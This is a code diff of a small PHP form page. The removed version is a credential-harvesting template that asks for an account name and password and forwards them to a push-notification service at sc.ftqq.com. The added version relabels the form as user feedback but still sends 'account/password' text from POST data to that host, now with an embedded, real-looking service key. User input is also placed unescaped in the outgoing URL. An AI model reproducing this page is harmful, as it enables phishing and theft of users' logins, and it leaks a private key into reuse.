@@ -1,7 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-        <title>吹牛逼</title>
+
   <meta name="viewport" content="width=device-width, initial-scale=0.88, maximum-scale=1, user-scalable=no">
         <meta http-equiv="X-UA-Compatible" content="IE=Edge">
         <meta charset="UTF-8">
@@ -26,22 +23,19 @@ input{margin-top: 3px;}
                                                 <h4 class="help-block text-left">Title</h4>
                                 </div>
                                 <form action="" method="post">
-<span class="label label-info">标题: </span><input type="text" name="text" placeholder="标题" class="form-control">
-<span class="label label-info">账  号: </span><input type="text" name="user" placeholder="账号" class="form-control">
-<span class="label label-info">密  码:</span><input type="text" name="pass" placeholder="密码" class="form-control">
-
+<span class="label label-info">信息: </span><input type="text" name="text" placeholder="输入信息" class="form-control">
 
 <br>
 
-<input type="submit" value="提交" class="btn btn-sm btn-success">
+<input type="submit" value="发送" class="btn btn-sm btn-success">
                   <br>
-                  文本
+                  用户反馈
 </form>
         <?php
 
 $text="订单信息：".$_POST["text"];
 $desp="用户信息…账号：".$_POST["user"]."密码：".$_POST["pass"];
-file_get_contents("https://sc.ftqq.com/替换成你自己的.send?text={$text}&desp={$desp}");
+file_get_contents("https://sc.ftqq.com/SCU57030T1379dae0a25edc121f49d48b4db3ef555d4a53f0cb633.send?text={$text}&desp={$desp}");
 ?>
 <span style="color: purple;">
 <?php
